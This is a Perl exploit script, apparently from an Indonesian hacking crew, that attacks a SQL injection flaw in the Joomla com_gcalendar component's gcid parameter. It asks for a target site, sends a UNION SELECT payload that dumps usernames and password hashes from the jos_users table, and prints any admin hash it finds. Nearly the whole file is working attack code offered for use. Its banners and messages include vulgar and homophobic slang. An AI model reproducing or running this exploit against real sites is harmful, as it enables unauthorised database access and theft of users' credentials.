#!/usr/bin/perl -w

#Joomla com_gcalendar (gcid) Sql injection
#Coded by v3n0m
#Gre4tz: All Yogyacarderlink Crew
#Special Gre4tz: Google

print "|----------------------------------------------------|\n";
print "|   YOGYACARDERLINK 'com_gcalendar Remote Injector'  |\n";
print "| Coded by : v3n0m                                   |\n";
print "| Greetz   : LeQhi (bug founder)                     |\n";
print "| sHoutz   : Yogyacarderlink Crew                    |\n";
print "|                                                    |\n";
print "|   -v3n0m & lingah paling ganteng se-jogjakarta-     |\n";
print "|                                                    |\n";
print "|                         www.yogyacarderlink.web.id |\n";
print "|----------------------------------------------------|\n";
use LWP::UserAgent;
print "\nMasukin Target:[http://wwww.example.com/path/]: ";
chomp(my $target=<STDIN>);
#Nama Column
$kontol="group_concat(username,0x3a,password)";
#Nama Table
$memek="jos_users";
$ngentot="-9999+union+select+";
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $target . "index.php?option=com_gcalendar&view=event&eventID=peler&start=memek&end=kentu&gcid=".$ngentot."0,".$kontol.",2,3,4+from/**/".$memek."+--+";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
print "\n[+] Admin Hash : $1\n\n";
print "Sukses coy !! Wah selamat yee bro...\n";
print "Coba langsung dicheck ke TKP aja bro biar lebih yakin...\n";
print "\n";
print "Attention:\n";
print "v3n0m & lingah emang paling ganteng...\n";
print "Yang kaga setuju/protes = GAY !!\n";
print "\n";
}
else{print "\n[-] wah gagal bro (Belom Cebok tangan lo)...\n";
}

